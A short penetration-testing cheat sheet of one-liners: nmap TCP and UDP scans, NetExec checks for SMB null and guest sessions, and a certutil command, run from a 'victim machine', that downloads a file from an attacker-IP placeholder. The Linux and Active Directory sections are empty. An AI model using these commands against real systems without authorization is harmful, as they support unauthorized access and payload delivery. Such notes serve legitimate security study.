# Oneliners

A compilation of useful oneliners.

## General:

Thorough aggressive scan of all ports with default scripts and service detection.
- `nmap -sC -sV -A -T4 -p- $IP`

Fast UDP scan
- `sudo nmap -sUV -F -T4 $IP`

## Windows:

Test null session (SMB port 445)
- `nxc smb $IP -u '' -p ''`

Test for guest logon (SMB port 445)
- `nxc smb $IP -u 'a' -p ''`

File transfer using certutil (Ran from victim machine)
- `certutil -urlcache -f http://<attacker_ip>/example.txt example.txt`

## Linux:

## Active Directory:
